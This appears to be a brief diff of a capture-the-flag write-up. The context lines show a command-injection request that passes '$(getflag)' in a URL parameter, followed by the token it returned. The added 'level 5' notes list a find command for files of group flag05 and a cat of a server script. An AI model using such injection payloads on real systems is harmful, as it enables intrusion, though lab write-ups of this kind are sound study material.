@@ -64,3 +64,10 @@ curl "http://127.0.0.1:4747/?x=\$(getflag)"
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 ```
 
+# level 5
+
+find / -group flag05 2>/dev/mull
+
+cat /usr/sbin/openarenaserver 
+
+
